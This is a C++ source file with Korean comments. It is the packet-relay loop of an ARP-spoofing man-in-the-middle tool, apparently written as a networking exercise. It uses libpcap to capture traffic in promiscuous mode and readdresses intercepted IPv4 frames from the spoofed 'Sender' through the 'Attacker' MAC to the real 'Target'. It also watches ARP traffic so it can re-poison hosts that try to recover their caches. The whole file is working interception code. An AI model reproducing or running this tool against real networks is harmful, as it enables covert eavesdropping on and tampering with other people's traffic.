#include "relay.h"
#include <csignal>
#include <cstdio>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arp_utils.h"

// SIGINT 처리 시 변경되는 패킷 수신 루프 종료 플래그
static volatile std::sig_atomic_t stopRequested = 0;

// 공통 패킷 수신 루프의 종료를 요청한다.
void requestPacketLoopStop() {
    stopRequested = 1;
}

// 지정한 인터페이스를 promiscuous mode로 연다.
pcap_t* openPacketCapture(
    const char* interfaceName
) {
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(
        interfaceName,
        BUFSIZ,
        1,
        1,
        errbuf
    );

    if (pcap == nullptr) {
        fprintf(
            stderr,
            "couldn't open device %s(%s)\n",
            interfaceName,
            errbuf
        );
    }

    return pcap;
}

// 패킷 종류와 관계없이 Ethernet Frame 하나를 수신한다.
//
// Ctrl+C가 입력되면 stopRequested를 확인하고
// 패킷 수신 대기를 종료한다.
bool receivePacket(
    pcap_t* pcap,
    std::vector<u_char>& packet
    ) {
    struct pcap_pkthdr* header;
    const u_char* receivedPacket;

    while (!stopRequested) {
        int res = pcap_next_ex(
            pcap,
            &header,
            &receivedPacket
            );

        if (res == 0) {
            continue;
        }

        if (res == -1) {
            fprintf(
                stderr,
                "pcap_next_ex fail: %s\n",
                pcap_geterr(pcap)
                );

            return false;
        }

        if (res == -2) {
            return false;
        }

        if (
            header->caplen < sizeof(EthHdr) ||
            header->caplen < header->len
            ) {
            continue;
        }

        packet.assign(
            receivedPacket,
            receivedPacket + header->caplen
            );

        return true;
    }

    // Ctrl+C 때문에 수신을 중단한 경우
    return false;
}

// 받은 IPv4 패킷을 Target에게 Relay한다.
//
// pcap   : pcap 핸들
// packet : Sender로부터 받은 원본 패킷
// aMac   : Attacker MAC
// tMac   : Target MAC
//
// receivePacket()에서 Ethernet 최소 길이를 확인했으므로
// 이 함수에서는 길이를 다시 검사하지 않는다.
bool relayPacket(
    pcap_t* pcap,
    std::vector<u_char>& packet,
    const Mac& aMac,
    const Mac& tMac
) {
    EthHdr* eth =
        reinterpret_cast<EthHdr*>(
            packet.data()
        );

    // Sender -> Attacker였던 Ethernet 주소를
    // Attacker -> Target으로 변경한다.
    eth->smac_ = aMac;
    eth->dmac_ = tMac;

    int res = pcap_sendpacket(
        pcap,
        packet.data(),
        packet.size()
    );

    if (res != 0) {
        fprintf(
            stderr,
            "pcap_sendpacket return %d error=%s\n",
            res,
            pcap_geterr(pcap)
        );

        return false;
    }

    return true;
}

// IPv4 패킷이 어느 Session에서 발생한 것인지 검색하고 Relay한다.
//
// EtherType 검사는 runPacketLoop()에서 이미 수행했으므로
// 이 함수에서는 중복 검사하지 않는다.
static void handleIpPacket(
    pcap_t* pcap,
    std::vector<u_char>& packet,
    const Mac& aMac,
    const std::vector<Session>& sessions
) {
    const EthHdr* eth =
        reinterpret_cast<const EthHdr*>(
            packet.data()
        );

    for (const Session& session : sessions) {
        bool belongsToSession =
            eth->smac_ == session.sMac &&
            eth->dmac_ == aMac;

        if (!belongsToSession) {
            continue;
        }

        if (!relayPacket(
                pcap,
                packet,
                aMac,
                session.tMac
            )) {
            fprintf(
                stderr,
                "Relay 패킷 전송 실패\n"
            );
        }

        break;
    }
}

// 공통 패킷 수신 루프
//
// 1. 패킷 하나 수신
// 2. Attacker 자신이 보낸 패킷 제외
// 3. EtherType 확인
// 4. IPv4이면 해당 Session으로 Relay
// 5. ARP이면 복구 시도를 확인하고 재감염
// 6. Ctrl+C가 입력되면 반복 종료
bool runPacketLoop(
    pcap_t* pcap,
    const Mac& aMac,
    const std::vector<Session>& sessions
    ) {
    while (!stopRequested) {
        std::vector<u_char> packet;

        if (!receivePacket(pcap, packet)) {
            // Ctrl+C 때문에 수신이 중단된 경우에는
            // 정상적으로 반복문을 종료한다.
            if (stopRequested) {
                break;
            }

            fprintf(
                stderr,
                "패킷 수신 실패\n"
                );

            return false;
        }

        const EthHdr* eth =
            reinterpret_cast<const EthHdr*>(
                packet.data()
                );

        // Attacker가 직접 보낸 패킷은 다시 처리하지 않는다.
        if (eth->smac_ == aMac) {
            continue;
        }

        uint16_t etherType =
            ntohs(eth->type_);

        if (etherType == EthHdr::Ip4) {
            handleIpPacket(
                pcap,
                packet,
                aMac,
                sessions
                );
        } else if (etherType == EthHdr::Arp) {
            if (packet.size() < sizeof(EthArpPacket)) {
                continue;
            }

            const EthArpPacket& arpPacket =
                *reinterpret_cast<const EthArpPacket*>(
                    packet.data()
                    );

            handleArpPacket(
                pcap,
                arpPacket,
                aMac,
                sessions
                );
        }
    }

    return true;
}